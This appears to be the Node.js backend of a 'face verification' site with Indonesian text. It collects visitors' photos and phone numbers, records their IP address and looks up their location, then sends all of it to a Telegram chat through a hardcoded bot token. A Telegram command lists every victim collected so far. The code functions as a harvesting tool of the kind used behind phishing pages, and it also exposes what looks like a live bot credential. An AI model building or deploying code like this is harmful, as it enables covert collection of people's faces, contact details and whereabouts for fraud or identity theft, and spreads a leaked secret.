require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
const CHAT_ID = '-7352381955'; // Ganti dengan chat ID tujuan

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Database
const DB_PATH = path.join(__dirname, 'data.json');

function readDatabase() {
  try {
    if (fs.existsSync(DB_PATH)) {
      const data = fs.readFileSync(DB_PATH, 'utf8');
      return JSON.parse(data);
    }
  } catch (e) {
    console.error('Error reading DB:', e);
  }
  return { users: [] };
}

function writeDatabase(data) {
  try {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error('Error writing DB:', e);
  }
}

// Get location from IP
async function getLocationFromIp(ip) {
  try {
    const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
    if (!cleanIp) return 'Tidak diketahui';
    
    const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city`);
    const data = await res.json();
    
    if (data.status === 'success') {
      return `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`;
    }
  } catch (e) {
    console.error('Geolocation error:', e.message);
  }
  return 'Tidak diketahui';
}

// Webhook untuk bot Telegram
app.post('/webhook', async (req, res) => {
  try {
    const { message } = req.body;
    
    if (message && message.text === '/info') {
      const chatId = message.chat.id;
      const db = readDatabase();
      
      if (db.users.length === 0) {
        await sendTelegramMessage(chatId, '📭 Belum ada data verifikasi.');
        return res.sendStatus(200);
      }
      
      let response = '📊 *DATA VERIFIKASI*\n\n';
      db.users.forEach((user, index) => {
        response += `${index + 1}. 📱 ${user.phone || 'User'}\n`;
        response += `   🕒 ${user.timestamp}\n`;
        response += `   📍 ${user.location}\n\n`;
      });
      response += `\nTotal: ${db.users.length} orang`;
      
      await sendTelegramMessage(chatId, response);
    }
    
    res.sendStatus(200);
  } catch (err) {
    console.error('Webhook error:', err);
    res.sendStatus(500);
  }
});

// Send message to Telegram
async function sendTelegramMessage(chatId, text) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'Markdown'
      })
    });
    return await response.json();
  } catch (err) {
    console.error('Send message error:', err);
  }
}

// Verify endpoint
app.post('/api/verify', async (req, res) => {
  try {
    let image, phone;
    
    if (req.is('multipart/form-data')) {
      image = req.body.image;
      phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
    } else {
      image = req.body.image;
      phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
    }
    
    if (!image) {
      return res.status(400).json({ success: false, error: 'Foto tidak ditemukan' });
    }
    
    // Get IP and location
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const location = await getLocationFromIp(ip);
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    
    // Save to database
    const db = readDatabase();
    db.users.push({
      phone: phone,
      timestamp: timestamp,
      location: location,
      ip: ip
    });
    writeDatabase(db);
    
    // Process image
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    
    // Send to Telegram
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', 
      `🟡 *Verifikasi Wajah*\n\n` +
      `📱 *User:* ${phone}\n` +
      `📍 *Lokasi:* ${location}\n` +
      `🕒 *Waktu:* ${timestamp}\n` +
      `🌐 *IP:* ${ip}\n\n` +
      `_Foto dikirim untuk verifikasi_`
    );
    form.append('photo', buffer, { 
      filename: `verifikasi_${Date.now()}.jpg`, 
      contentType: 'image/jpeg' 
    });
    
    const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form,
    });
    
    const tgData = await tgResponse.json();
    
    if (!tgData.ok) {
      console.error('Telegram error:', tgData);
      return res.status(500).json({ 
        success: false, 
        error: 'Gagal kirim ke Telegram' 
      });
    }
    
    res.json({ success: true });
    
  } catch (err) {
    console.error('Verify error:', err);
    res.status(500).json({ 
      success: false, 
      error: err.message || 'Terjadi kesalahan server' 
    });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Bot token: ${BOT_TOKEN.substring(0, 10)}...`);
  console.log(`📊 Webhook: http://localhost:${PORT}/webhook`);
});
